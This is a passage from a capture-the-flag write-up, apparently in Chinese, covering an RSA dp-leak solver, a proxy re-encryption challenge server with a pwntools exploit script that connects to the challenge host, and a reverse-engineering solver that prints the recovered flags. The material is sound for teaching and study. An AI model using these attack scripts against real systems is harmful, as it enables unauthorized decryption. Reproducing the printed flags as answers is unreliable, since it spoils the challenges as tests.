class="number">7431</span>, <span class="number">2765</span>, <span class="number">827</span>, <span class="number">102</span>, <span class="number">1419</span>, <span class="number">6528</span>, <span class="number">735</span>, <span class="number">5653</span>, <span class="number">109</span>, <span class="number">4158</span>, <span class="number">5877</span>, <span class="number">5975</span>, <span class="number">1527</span>, <span class="number">3027</span>, <span class="number">9776</span>, <span class="number">5263</span>, <span class="number">5211</span>, <span class="number">1293</span>, <span class="number">5976</span>, <span class="number">7759</span>, <span class="number">3268</span>, <span class="number">1893</span>, <span class="number">6546</span>, <span class="number">4684</span>, <span class="number">419</span>, <span class="number">8334</span>, <span class="number">7621</span>, <span class="number">1649</span>, <span class="number">6840</span>, <span class="number">2975</span>, <span class="number">8605</span>, <span class="number">5714</span>, <span class="number">2709</span>, <span class="number">1109</span>, <span class="number">358</span>, <span class="number">2858</span>, <span class="number">6868</span>, <span class="number">2442</span>, <span class="number">8431</span>, <span class="number">8316</span>, <span class="number">5446</span>, <span class="number">9356</span>, <span class="number">2817</span>, <span class="number">2941</span>, <span class="number">3177</span>, <span class="number">7388</span>, <span class="number">4149</span>, <span class="number">4634</span>, <span class="number">4316</span>, <span class="number">5377</span>, <span class="number">4327</span>, <span class="number">1774</span>, <span class="number">6613</span>, <span class="number">5728</span>, <span class="number">1751</span>, <span class="number">8478</span>, <span class="number">3132</span>, <span class="number">4680</span>, <span class="number">3308</span>, <span class="number">9769</span>, <span class="number">8341</span>, <span class="number">1627</span>, <span class="number">3501</span>, <span class="number">1046</span>, <span class="number">2609</span>, <span class="number">7190</span>, <span class="number">5706</span>, <span class="number">3627</span>, <span class="number">8867</span>, <span class="number">2458</span>, <span class="number">607</span>, <span class="number">642</span>, <span class="number">5436</span>, <span class="number">6355</span>, <span class="number">6326</span>, <span class="number">1481</span>, <span class="number">9887</span>, <span class="number">205</span>, <span class="number">5511</span>, <span class="number">537</span>, <span class="number">8576</span>, <span class="number">6376</span>, <span class="number">3619</span>, <span class="number">6609</span>, <span class="number">8473</span>, <span class="number">2139</span>, <span class="number">3889</span>, <span class="number">1309</span>, <span class="number">9878</span>, <span class="number">2182</span>, <span class="number">8572</span>, <span class="number">9275</span>, <span class="number">5235</span>, <span class="number">6989</span>, <span class="number">6592</span>, <span class="number">4618</span>, <span class="number">7883</span>, <span class="number">5702</span>, <span class="number">3999</span>, <span class="number">925</span>, <span class="number">2419</span>, <span class="number">7838</span>, <span class="number">3073</span>, <span class="number">488</span>, <span class="number">21</span>, <span class="number">3280</span>, <span class="number">9915</span>, <span class="number">3672</span>, <span class="number">579</span>]</span><br><span class="line">res=[<span class="number">55</span>, <span class="number">5</span>, <span class="number">183</span>, <span class="number">192</span>, <span class="number">103</span>, <span class="number">32</span>, <span class="number">211</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">120</span>, <span class="number">118</span>, <span class="number">54</span>, <span class="number">120</span>, <span class="number">145</span>, <span class="number">185</span>, <span class="number">254</span>, <span class="number">77</span>, <span class="number">144</span>, <span class="number">70</span>, <span class="number">54</span>, <span class="number">193</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">244</span>, <span class="number">190</span>, <span class="number">23</span>, <span class="number">215</span>, <span class="number">187</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">27</span>, <span class="number">138</span>, <span class="number">42</span>, <span class="number">89</span>, <span class="number">158</span>, <span class="number">254</span>, <span class="number">159</span>, <span class="number">133</span>, <span class="number">78</span>, <span class="number">11</span>, <span class="number">155</span>, <span class="number">163</span>, <span class="number">145</span>, <span class="number">248</span>, <span class="number">14</span>, <span class="number">179</span>, <span class="number">23</span>, <span class="number">226</span>, <span class="number">220</span>, <span class="number">201</span>, <span class="number">5</span>, <span class="number">71</span>, <span class="number">241</span>, <span class="number">195</span>, <span class="number">75</span>, <span class="number">191</span>, <span class="number">237</span>, <span class="number">108</span>, <span class="number">141</span>, <span class="number">141</span>, <span class="number">185</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">191</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">83</span>, <span class="number">212</span>, <span class="number">242</span>, <span class="number">21</span>, <span class="number">143</span>, <span class="number">255</span>, <span class="number">164</span>, <span class="number">146</span>, <span class="number">119</span>, <span class="number">173</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">193</span>, <span class="number">173</span>, <span class="number">2</span>, <span class="number">224</span>, <span class="number">205</span>, <span class="number">68</span>, <span class="number">10</span>, <span class="number">77</span>, <span class="number">180</span>, <span class="number">24</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">205</span>, <span class="number">108</span>, <span class="number">28</span>, <span class="number">243</span>, <span class="number">80</span>, <span class="number">140</span>, <span class="number">4</span>, <span class="number">98</span>, <span class="number">76</span>, <span class="number">217</span>, <span class="number">70</span>, <span class="number">208</span>, <span class="number">202</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">124</span>, <span class="number">10</span>, <span class="number">168</span>, <span class="number">165</span>, <span class="number">223</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">152</span>, <span class="number">48</span>, <span class="number">152</span>, <span class="number">51</span>, <span class="number">133</span>, <span class="number">190</span>, <span class="number">202</span>, <span class="number">136</span>, <span class="number">204</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">196</span>, <span class="number">219</span>, <span class="number">71</span>, <span class="number">150</span>, <span class="number">68</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">218</span>, <span class="number">173</span>, <span class="number">19</span>, <span class="number">201</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">85</span>, <span class="number">201</span>, <span class="number">24</span>, <span class="number">59</span>, <span class="number">186</span>, <span class="number">46</span>, <span class="number">130</span>, <span class="number">147</span>, <span class="number">219</span>, <span class="number">22</span>, <span class="number">81</span>]</span><br><span class="line">dp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seeds)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        x=random.randint(<span class="number">0</span>,<span class="number">255</span>)</span><br><span class="line">        <span class="keyword">if</span> j==i%<span class="number">4</span>:</span><br><span class="line">            xx=x^res[i]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(xx))</span><br><span class="line">            dp+=<span class="built_in">chr</span>(xx)</span><br><span class="line"><span class="built_in">print</span>(dp)</span><br><span class="line"><span class="comment">#py3</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom_dp</span>(<span class="params">n,e,c,dp</span>):</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):</span><br><span class="line">            p=(e*dp-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">            <span class="keyword">assert</span> n%p==<span class="number">0</span></span><br><span class="line">            q=n//p</span><br><span class="line">            phin=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            d=gmpy2.invert(e, phin)</span><br><span class="line">            m=<span class="built_in">pow</span>(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">N=<span class="number">81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span></span><br><span class="line">dp=<span class="number">5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057</span></span><br><span class="line">boom_dp(N,e,c,dp)</span><br><span class="line"><span class="comment">#flag&#123;74281db3-c6f0-e59a-4da6-39b8c71250fe&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="share-secret"><a href="#share-secret" class="headerlink" title="share secret"></a>share secret</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p, g = <span class="number">0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3</span>, \</span><br><span class="line">       <span class="number">0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h2</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(sha256(m).hexdigest(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_gen</span>(<span class="params">nbits</span>):</span></span><br><span class="line">    s = getrandbits(nbits) % p</span><br><span class="line">    <span class="keyword">while</span> s.bit_length() &lt; nbits - <span class="number">2</span>:</span><br><span class="line">        s = getrandbits(nbits) % p</span><br><span class="line">    pk = <span class="built_in">pow</span>(g, s, p)</span><br><span class="line">    <span class="keyword">return</span> pk, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">m, pk</span>):</span></span><br><span class="line">    m = s2n(m)</span><br><span class="line">    e, v = getrandbits(<span class="number">256</span>), getrandbits(<span class="number">256</span>)</span><br><span class="line">    E, V = <span class="built_in">pow</span>(g, e, p), <span class="built_in">pow</span>(g, v, p)</span><br><span class="line">    s = v + e * h2(n2s(E) + n2s(V))</span><br><span class="line">    c = m * <span class="built_in">pow</span>(pk, e + v, p) % p</span><br><span class="line">    cap = (E, V, s)</span><br><span class="line">    <span class="keyword">return</span> c, cap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rk_gen</span>(<span class="params">sk, pki, group=<span class="number">9</span></span>):</span></span><br><span class="line">    x, r = getrandbits(<span class="number">512</span>) % p, getrandbits(<span class="number">512</span>) % p</span><br><span class="line">    prefix = n2s(<span class="built_in">pow</span>(g, x * sk, p)).rjust(<span class="number">64</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    encoder = [<span class="number">1</span>, -<span class="built_in">pow</span>(pki, x * sk, p) % p]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, group + <span class="number">1</span>):</span><br><span class="line">        pkj = getrandbits(<span class="number">512</span>)</span><br><span class="line">        new_encoder = [<span class="number">1</span>]</span><br><span class="line">        cur = <span class="built_in">pow</span>(pkj, x * sk, p)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">            new_encoder.append((encoder[j] + (-<span class="number">1</span>) * cur * encoder[j - <span class="number">1</span>]) % p)</span><br><span class="line">        new_encoder.append(encoder[i] * cur * (-<span class="number">1</span>) % p)</span><br><span class="line">        encoder = new_encoder</span><br><span class="line">    </span><br><span class="line">    encoder[-<span class="number">1</span>] += r</span><br><span class="line">    dd = h2(prefix + n2s(r).rjust(<span class="number">64</span>, <span class="string">&#x27;\x00&#x27;</span>)) | <span class="number">1</span></span><br><span class="line">    rk = sk * dd</span><br><span class="line">    <span class="keyword">return</span> rk, encoder[<span class="number">1</span>:], prefix</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_enc</span>(<span class="params">rk, cipher</span>):</span></span><br><span class="line">    c, (E, V, s) = cipher</span><br><span class="line">    E_ = <span class="built_in">pow</span>(E, rk, p)</span><br><span class="line">    V_ = <span class="built_in">pow</span>(V, rk, p)</span><br><span class="line">    s_ = s * rk % p</span><br><span class="line">    <span class="keyword">return</span> c, (E_, V_, s_)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedTCPServer</span>(<span class="params">SocketServer.ThreadingMixIn, SocketServer.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EncHandler</span>(<span class="params">SocketServer.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.request.sendall(<span class="string">&quot;Welcome to our netdisk system! Our system store only users&#x27; ciphertext\n&quot;</span>)</span><br><span class="line">        self.request.sendall(<span class="string">&quot;Now you can choose what you wanna do\n&quot;</span>)</span><br><span class="line">        self.request.sendall(<span class="string">&quot;1. generate your key\n2. start challenge\n2. get the ciphertext&quot;</span>)</span><br><span class="line">        pk_of_one_user, sk_of_one_user = key_gen(<span class="number">512</span>)</span><br><span class="line">        cipher = enc(flag, pk_of_one_user)</span><br><span class="line">        </span><br><span class="line">        pk, sk = key_gen(<span class="number">512</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mul = <span class="number">1</span></span><br><span class="line">            self.request.sendall(<span class="string">&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">            self.request.sendall(<span class="string">&quot;choice&gt;&quot;</span>)</span><br><span class="line">            choice = self.request.recv(<span class="number">16</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                self.request.sendall(<span class="string">&#x27;Please take good care of it!\n&#x27;</span> + <span class="built_in">hex</span>(pk) + <span class="string">&#x27;,&#x27;</span> + <span class="built_in">hex</span>(sk) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                group_list = [<span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>, <span class="number">256</span>]</span><br><span class="line">                <span class="keyword">for</span> group <span class="keyword">in</span> group_list:</span><br><span class="line">                    m = getrandbits(<span class="number">200</span>)</span><br><span class="line">                    </span><br><span class="line">                    plaintext = n2s(m)</span><br><span class="line">                    cur_cipher = enc(plaintext, pk_of_one_user)</span><br><span class="line">                    </span><br><span class="line">                    rk, encoder, prefix = rk_gen(sk_of_one_user, pk, group=group)</span><br><span class="line">                    </span><br><span class="line">                    mul *= rk</span><br><span class="line">                    mul %= p</span><br><span class="line">                    </span><br><span class="line">                    new_cipher = re_enc(rk, cur_cipher)</span><br><span class="line">                    </span><br><span class="line">                    self.request.sendall(<span class="string">&#x27;The cipher shared to you\n&#x27;</span> + <span class="built_in">str</span>(new_cipher) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                    self.request.sendall(<span class="string">&#x27;prefix, encoder = &#x27;</span> + <span class="built_in">str</span>((encoder, prefix.encode(<span class="string">&#x27;hex&#x27;</span>))) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                    ans = self.request.recv(<span class="number">1024</span>).strip()</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">int</span>(ans, <span class="number">16</span>) != m:</span><br><span class="line">                        exit(<span class="number">1</span>)</span><br><span class="line">                self.request.sendall(<span class="string">&#x27;You are a clever boy! Now I can share you some other information!\n&#x27;</span> + <span class="built_in">hex</span>(mul) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                self.request.sendall(<span class="built_in">str</span>(cipher) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">1213</span></span><br><span class="line">    server = ThreadedTCPServer((HOST, PORT), EncHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Crypto/%40YL_3YQ4O9%40~%7BXHNUVGL%40P8.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h2</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(sha256(m).hexdigest(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;47.104.85.225&#x27;</span>,<span class="number">62351</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please take good care of it!\n&#x27;</span>)</span><br><span class="line">pk_sk=p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode()[<span class="number">2</span>:-<span class="number">1</span>].split(<span class="string">&#x27;L,0x&#x27;</span>)</span><br><span class="line">pk,sk=<span class="built_in">int</span>(pk_sk[<span class="number">0</span>],<span class="number">16</span>),<span class="built_in">int</span>(pk_sk[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">pp, g = <span class="number">0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3</span>, \</span><br><span class="line">           <span class="number">0x85fd9ae42b57e515b7849b232fcd9575c18131235104d451eeceb991436b646d374086ca751846fdfec1ff7d4e1b9d6812355093a8227742a30361401ccc5577</span></span><br><span class="line">   </span><br><span class="line">group_list = [<span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>, <span class="number">256</span>]</span><br><span class="line">D=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> group <span class="keyword">in</span> group_list:</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;The cipher shared to you\n&#x27;</span>)</span><br><span class="line">    cc=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;L, &#x27;</span>)[<span class="number">1</span>:-<span class="number">3</span>])</span><br><span class="line">    new_cipher=[cc]</span><br><span class="line">    new_cipher+=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;)\n&#x27;</span>)[:-<span class="number">2</span>].decode().replace(<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    c,E_,V_,s_=new_cipher</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;prefix, encoder = &#x27;</span>)</span><br><span class="line">    lateset_encoder,prefix=pre_enc=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode().replace(<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    prefix=<span class="built_in">int</span>(prefix,<span class="number">16</span>)</span><br><span class="line">    encoder=[<span class="number">1</span>,(-<span class="built_in">pow</span>(prefix,sk,pp)) %pp]</span><br><span class="line">    prefix = n2s(prefix).rjust(<span class="number">64</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    ml=[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lateset_encoder)):</span><br><span class="line">        ml.append((ml[-<span class="number">1</span>]*encoder[-<span class="number">1</span>]+lateset_encoder[i]*(-<span class="number">1</span>)**(i+<span class="number">1</span>))%pp)</span><br><span class="line">    r=-ml[-<span class="number">1</span>]%pp</span><br><span class="line">    dd = h2(prefix + n2s(r).rjust(<span class="number">64</span>, <span class="string">b&#x27;\x00&#x27;</span>)) | <span class="number">1</span></span><br><span class="line">    D*=dd</span><br><span class="line">    d=invert(dd,pp-<span class="number">1</span>)</span><br><span class="line">    cccc=E_*V_%pp</span><br><span class="line">    xx=<span class="built_in">pow</span>(cccc,d,pp)</span><br><span class="line">    m=c*invert(xx,pp)%pp</span><br><span class="line">    p.send(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;You are a clever boy! Now I can share you some other information!\n0x&#x27;</span>)</span><br><span class="line">mul=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*****************************************************&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(D)</span><br><span class="line"><span class="built_in">print</span>(mul)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*****************************************************&quot;</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">cc=<span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;L, &#x27;</span>)[<span class="number">1</span>:-<span class="number">3</span>])</span><br><span class="line">cipher=[cc]</span><br><span class="line">cipher+=<span class="built_in">eval</span>(p.recvuntil(<span class="string">&#x27;)\n&#x27;</span>)[:-<span class="number">2</span>].decode().replace(<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*****************************************************&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*****************************************************&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from gmpy2 import *</span></span><br><span class="line"><span class="string">p=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3</span></span><br><span class="line"><span class="string">D=</span></span><br><span class="line"><span class="string">mul=</span></span><br><span class="line"><span class="string">c=mul*invert(D,p)%p</span></span><br><span class="line"><span class="string">e=4</span></span><br><span class="line"><span class="string">R.&lt;x&gt; = Zmod(p)[]</span></span><br><span class="line"><span class="string">f = x ^ e- c</span></span><br><span class="line"><span class="string">f = f.monic()</span></span><br><span class="line"><span class="string">res1 = f.roots()</span></span><br><span class="line"><span class="string">print(res1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">from gmpy2 import *</span></span><br><span class="line"><span class="string">pp=0xb5655f7c97e8007baaf31716c305cf5950a935d239891c81e671c39b7b5b2544b0198a39fd13fa83830f93afb558321680713d4f6e6d7201d27256567b8f70c3</span></span><br><span class="line"><span class="string">sk=3415391405045794570454819264678842883406589094879440924771251075986414212665514615692960890299627279215019657097231396800926908716766924569917256830117771</span></span><br><span class="line"><span class="string">cipher=[2527933870918239983384943711339580604598094277545525217834226330258419910301299206846573883556622915108773654201000637301174540362470098333217770989148988, 1534944798391033818702709152362158543885444981173771976353948339054898890879750350964082465225558424319599976320653165768478628695969238760863936634123497, 6480111027732079088305364577732332359884279592380152181509453693475437439597161069742983512858501419606525584662299391909461177747617022491590642108315732, 3294517958162409271434180708054007225109922377603959481825421096746414863994421950281118003999380326689412683711381872657890904915131742940967848977783892]</span></span><br><span class="line"><span class="string">c,E,V,s=cipher</span></span><br><span class="line"><span class="string">xx=E*V%pp</span></span><br><span class="line"><span class="string">m=c*invert(pow(xx,sk,pp),pp)%pp</span></span><br><span class="line"><span class="string">print(long_to_bytes(m))</span></span><br><span class="line"><span class="string">#flag&#123;504d0411-6707-469b-be31-9868200aca95&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Rev-Dizzy"><a href="#Rev-Dizzy" class="headerlink" title="Rev_Dizzy"></a>Rev_Dizzy</h2><p>一串简单的数学计算，首先是IDA F5，挺慢的，多等等，如果提示要逆的太大了，就自己百度一下，改一下<br><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101918.png"></p>
<p>给了运算、给了最后比较的值，逆一下就行了，将所有复制出来，只留下运算的部分，然后写个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x27</span>, <span class="number">0x3C</span>, <span class="number">0xE3</span>, <span class="number">0xFC</span> ,<span class="number">46</span> ,<span class="number">65</span> ,<span class="number">7</span> ,<span class="number">94</span> ,<span class="number">98</span> ,-<span class="number">49</span> ,-<span class="number">24</span> ,-<span class="number">14</span> ,-<span class="number">110</span> ,<span class="number">128</span> ,-<span class="number">30</span> ,<span class="number">54</span> ,-<span class="number">76</span> ,-<span class="number">78</span> ,<span class="number">103</span> ,<span class="number">119</span> ,<span class="number">15</span> ,-<span class="number">10</span> ,<span class="number">13</span> ,-<span class="number">74</span> ,-<span class="number">19</span> ,<span class="number">28</span> ,<span class="number">101</span> ,-<span class="number">118</span> ,<span class="number">7</span> ,<span class="number">83</span> ,-<span class="number">90</span> ,<span class="number">102</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)):</span><br><span class="line">    <span class="keyword">if</span>(i != <span class="built_in">len</span>(f)-<span class="number">1</span>):</span><br><span class="line">        f[i] = f[i][:-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f[i] = f[i][:-<span class="number">1</span>]</span><br><span class="line">f1 = [<span class="string">&#x27;&#x27;</span>]*<span class="built_in">len</span>(f)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)):</span><br><span class="line">    f1[i] = f[<span class="built_in">len</span>(f)-<span class="number">1</span>-i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f1)):</span><br><span class="line">    tmp = f1[i].replace(<span class="string">&#x27;byte_43841C&#x27;</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&#x27;+=&#x27;</span> <span class="keyword">in</span> tmp):</span><br><span class="line">        tmp = tmp.replace(<span class="string">&#x27;+=&#x27;</span>,<span class="string">&#x27;-=&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span>(<span class="string">&#x27;-=&#x27;</span> <span class="keyword">in</span> tmp):</span><br><span class="line">        tmp = tmp.replace(<span class="string">&#x27;-=&#x27;</span>,<span class="string">&#x27;+=&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">exec</span>(tmp)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(s[i]%<span class="number">256</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{Try_R3vers1ng_W1th_ScR!pt!}</p>
</blockquote>
